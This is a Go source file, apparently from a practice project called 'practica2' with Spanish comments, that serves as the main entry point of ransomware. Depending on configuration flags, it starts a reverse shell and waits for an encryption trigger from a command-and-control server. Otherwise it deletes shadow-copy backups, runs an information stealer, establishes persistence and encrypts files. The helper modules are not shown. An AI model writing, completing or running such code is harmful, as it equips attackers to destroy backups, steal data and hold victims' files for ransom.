package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"practica2/config"
	"practica2/core"
	"practica2/utils"
)

func main() {
	// Confirmación en modo debug antes de ejecutar
	if config.EnableDebugMode {
		fmt.Println("=== MODO DEBUG ACTIVADO ===")
		fmt.Print("¿Continuar? (s/n): ")
		reader := bufio.NewReader(os.Stdin)
		response, _ := reader.ReadString('\n')
		if strings.ToLower(strings.TrimSpace(response))[0] != 's' {
			return
		}
	}

	// Modo 1: Con reverse shell - espera comando C2 para cifrar
	if config.EnableReverseShell {
		config.DebugPrint("[*] Esperando clave desde servidor: %s\n", config.ReverseShellServer)
		go utils.StartReverseShell()
		<-utils.GetEncryptionTrigger() // Espera señal de cifrado desde C2
		config.DebugPrintln("[+] Iniciando cifrado...")
		core.StartEncryption()
		config.DebugPrintln("[*] Manteniendo conexión activa...")
		select {} // Mantener proceso activo indefinidamente
	} else {
		// Modo 2: Sin reverse shell - ejecuta automáticamente todos los módulos
		// Si NO hay reverse shell, ejecutar shadow copy deletion automáticamente
		if config.EnableShadowCopyDeletion {
			config.DebugPrintln("[*] Eliminando respaldos...")
			utils.ExecuteShadowCopyDeletion()
		}

		if config.EnableInfoStealer {
			config.DebugPrintln("[*] Recopilando información...")
			_, err := utils.StealInformation()
			if err != nil && config.EnableDebugMode {
				fmt.Printf("Error recopilando información: %v\n", err)
			}
		}

		if config.EnablePersistence {
			config.DebugPrintln("[*] Estableciendo persistencia...")
			err := utils.EstablishPersistence()
			if err != nil && config.EnableDebugMode {
				fmt.Printf("Error en persistencia: %v\n", err)
			}
		}

		config.DebugPrintln("[*] Iniciando cifrado...")
		err := core.StartEncryption()
		if err != nil && config.EnableDebugMode {
			fmt.Printf("Error: %v\n", err)
			bufio.NewReader(os.Stdin).ReadBytes('\n')
			return
		}

		config.DebugPrintln("[+] Completado")
		if config.EnableDebugMode {
			fmt.Println("\nPresiona Enter para cerrar...")
			bufio.NewReader(os.Stdin).ReadBytes('\n')
		}
	}
}
